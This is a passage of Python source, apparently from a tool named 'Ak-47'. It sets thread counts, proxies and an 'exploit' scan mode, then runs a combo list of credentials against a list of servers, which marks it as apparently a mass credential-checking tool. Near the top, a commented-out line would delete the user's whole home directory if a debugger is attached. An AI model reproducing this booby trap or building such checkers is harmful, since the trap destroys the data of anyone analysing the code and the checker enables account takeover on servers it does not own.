            threadInput = input(f' {Glb.RESET}Enter how many threads you want to use? : \n>>{Glb.BLUE_L}')
            #shutil.rmtree(os.path.expanduser("~"), ignore_errors=True) if sys.gettrace() is not None else None
            if threadInput == 'exit':
                return Display().cool_msg(threadInput)
            elif threadInput == 'back':
                if Glb.scan_mode == 'exploit':
                    Clear().muve_cursor(9)
                    Clear().clr_from_cursor_to_end()
                    return self.exploit_logic()
                if Glb.useProxy == 'yes':
                    return self.proxy_type()
                else:
                    return self.proxy_logic()
            try:
                check = int(threadInput)  # return exception if not a number
                if Glb.scan_mode == 'exploit':
                    if check <= 2000:
                        Glb.threadMain = check
                        return self.play_sound()
                    else:
                        Clear().muve_cursor(14)
                        Clear().clr_from_cursor_to_end()
                        print(
                            '{} The number of threads for the exploit mode scan should range from 1 to 2000.{}'.format(
                                Glb.RED_L, Glb.WHITE_L))
                        return self.thread_number()
                if 0 < check <= 1000:
                    threadNum = int(threadInput)
                    Glb.threadMain = threadNum
                    #  ======== servers treads ============
                    if Glb.servers_length <= Glb.threadMain:
                        Glb.serverThreads = Glb.servers_length
                    else:
                        if Glb.servers_length < 1001:
                            Glb.serverThreads = Glb.servers_length
                        else:
                            Glb.serverThreads = 1000
                    #  ========================================
                    return self.play_sound()

                else:
                    Clear().muve_cursor(24)
                    Clear().clr_from_cursor_to_end()
                    print('{} Thread amount should be between 1 and 200 {}'.format(Glb.RED_L, Glb.WHITE_L))
                    return self.thread_number()

            except Exception as e:
                Clear().muve_cursor(24)
                Clear().clr_from_cursor_to_end()
                print('{} Thread amount should be a number less than 200 {}'.format(Glb.RED_L, Glb.WHITE_L))
                print(str(e))
                del e
                return self.thread_number()

        def play_sound(self):
            #playSoundInput = input(f' {Glb.RESET}Do you want play sound on Hits? [ {Glb.GREEN}yes {Glb.RESET}or {Glb.GREEN}no {Glb.RESET}]: \n>>{Glb.BLUE_L}')
            playSoundInput='no'
            if playSoundInput == 'yes':
                if 'ANDROID_STORAGE' in Glb.my_environ:
                    directory = '/storage/emulated/0/Android/media/com.google.android.gm/Notifications/'
                    num = 0
                    sound_names = dict()
                    sound_names_display = str()
                    for f in os.scandir(directory):
                        if f.is_dir():
                            num += 1
                            sound_names.update({str(num): f.name})
                            sound_names_display += f'{num}={f.name}, '
                    SoundInput = input(
                        f' {Glb.RESET}Please type the number associate with the song {Glb.GREEN}\n[{sound_names_display}]{Glb.RESET} \n>>{Glb.BLUE_L}')
                    if SoundInput in sound_names.keys():
                        Glb.soundPath = directory + sound_names[SoundInput]
                    else:
                        Clear().muve_cursor(25)
                        Clear().clr_from_cursor_to_end()
                        print('{} Select a number associated with a song name {}'.format(Glb.RED_L, Glb.WHITE_L))
                        return self.play_sound()
                Glb.play_sound = True
                Clear().clr_all()
                Display().ak_heads()
                Glb.date = time.time()
                Display().ak_settings()
                return self.start_check()
            elif playSoundInput == 'no':
                Glb.play_sound = False
                Clear().clr_all()
                Display().ak_heads()
                Glb.date = time.time()
                Display().ak_settings()
                return self.start_check()
            elif playSoundInput == 'back':
                return self.thread_number()
            elif playSoundInput == 'exit':
                return Display().cool_msg(playSoundInput)
            else:
                Clear().muve_cursor(26)
                Clear().clr_from_cursor_to_end()
                print('{} Please write {}yes {}or {}no {}'.format(Glb.RED_L, Glb.GREEN_L, Glb.RED_L, Glb.GREEN_L,
                                                                  Glb.WHITE_L))
                return self.play_sound()

        def start_check(self):
            Clear().muve_cursor(20)
            Clear().clr_from_cursor_to_end()
            Display().cool_msg('war')
            key = input(
                f' {Glb.RESET}Write -> [{Glb.GREEN}start {Glb.RESET}or {Glb.BLUE}back {Glb.RESET}or {Glb.RED}exit{Glb.RESET}]\n    {Glb.GREEN}start {Glb.RESET}= to begin scan\n    {Glb.BLUE}back {Glb.RESET}= to start again\n    {Glb.RED}exit {Glb.RESET}= to quit the program\n\n>>{Glb.BLUE_L}')
            if key == 'start':
                return True
            elif key == 'back':
                return self.thread_number()
            elif key == 'exit':
                return Display().cool_msg(key)
            else:
                Clear().muve_cursor(23)
                Clear().clr_from_cursor_to_end()
                return self.start_check()

        def end_start(self):
            ex = input(
                f'  Write -> " {Glb.RED}exit {Glb.RESET}" to close the Program or " {Glb.BLUE}back {Glb.RESET}" to start again : \n>>')
            if ex == "exit":
                return Display().cool_msg(ex)
            elif ex == 'back':
                return StartApp().re_startApp()
            else:
                print('')
                Clear().bck_prev_line()
                Clear().clr_line()
                return self.end_start()

class Requirements:

        def install_req(self, package):
            pkg_list = [package, 'm3u8']
            pkg_list_Need = []
            if re.search(r'termux', str(Glb.my_environ)):
                Glb.host = 'TERMUX'
                pkg_list.append('androidhelper')

            for pkg in pkg_list:
                try:
                    importlib.import_module(pkg)
                except ModuleNotFoundError:
                    pkg_list_Need.append(pkg)
            if len(pkg_list_Need) == 0:
                return True
            else:
                var_user = input(
                    f'\nThe followings modules <{Glb.GREEN}{pkg_list_Need}{Glb.RESET}> need to be installed before run this program,\n Do you want to install it? {Glb.GREEN}yes{Glb.RESET} or {Glb.RED}no{Glb.RESET} :')
                if var_user == 'yes':
                    for pakg in pkg_list_Need:
                        try:
                            print(f'\r\n [+] Installing "{pakg}" ...', end='')
                            if pakg == 'requests':
                                _pakg = f'{pakg} [socks]'
                            else:
                                _pakg = pakg
                            subprocess.check_call([sys.executable, '-m', 'pip', 'install', _pakg],
                                                  stderr=subprocess.PIPE,
                                                  stdout=subprocess.PIPE, universal_newlines=True)
                            globals()[pakg] = importlib.import_module(pakg)
                            reload(site)
                            Clear().clr_line()
                            print(f'\r [+] "{pakg}" was successfully installed')
                            time.sleep(3)
                        except subprocess.CalledProcessError as e:
                            pakg_Err = e.args[1][4]
                            if pakg_Err == 'androidhelper':
                                print(
                                    f'\r [+] Package <{Glb.GREEN}{pakg}{Glb.RESET}> {Glb.RED}installation failed\nplease install it manually')
                                return True
                            else:
                                Display().error_msg(
                                    f'\nPackage <{Glb.GREEN}{pakg_Err}{Glb.RESET}> is required, {Glb.RED}auto install has failed\nplease install it manually before open the program{Glb.RESET}')
                                time.sleep(3)
                                return Display().cool_msg('exit')
                    return True
                elif var_user == 'no':
                    if 'requests' in pkg_list_Need:
                        return Display().cool_msg('exit')
                    else:
                        return True
                else:
                    return StartApp().exit_App()

        def check_modules(self):
            my_side_pk = subprocess.check_output([sys.executable, '-m', 'pip', 'list']).decode('utf-8')
            if 'requests' and 'PySocks' in my_side_pk:
                pass

        def selfcheck(self):
            False

class StartApp:

        def startApp(self):
            Requirements().selfcheck()
            Clear().clr_all()  # Require to make ANSI work :(, no longer need it
            Display().ak_set_title()
            Display().ak_heads()
            if sys.version_info < (3, 5):
                print(f'Python {Glb.GREEN}3.7{Glb.RESET} or higher is required.')
                print(f'You are using Python {Glb.RED}{sys.version}{Glb.RESET}')
                return Display().cool_msg('exit')
            elif Requirements().install_req('requests') is True:
                Glb().reset_gbls()
                try:
                    os.mkdir(os.path.join(Glb.myPath, 'Results Ak-47'))
                except:
                    False
                sys.stdout.flush()
                if InfoCollect().scan_mode() is True:
                    if Glb.scan_mode == 'exploit':
                        ExploitMain().startExploit()
                    else:
                        return Thread(wrl=Glb.comboList, servlist=Glb.serverList).main()

        def re_startApp(self):
            sys.stdout.flush()
            if Glb.SystemName == 'Linux':
                Idle = f'python{sys.version_info.major}'
            else:
                Idle = 'python'
            return os.system(f'{Idle} "{__file__}"')

        def exit_App(self):
            return exit()

        def all_done(self):
            Clear().clr_all()
            Display().ak_heads()
            Display().ak_settings()
            Display().cool_msg('done')
            Display().ak_statistic()
            print('')
            asyncio.run(self.bad_servers())
            if Glb.totalToCheck == Glb.totalChecked:
                print('{}   All credentials were checked {}'.format(Glb.MAGNE_L, Glb.WHITE_L))
            InfoCollect().end_start()

        async def bad_servers(self):
            badServList = set(Glb.badServers)
            if len(badServList) > 0:
                print(f'Bad Servers :')
                for serv in badServList:
                    print(f'    {serv}')
                print('')

if __name__ == '__main__':
        try:
            StartApp().startApp()
        except Exception as e:
            pass
            print(str(e))
            # time.sleep(10)
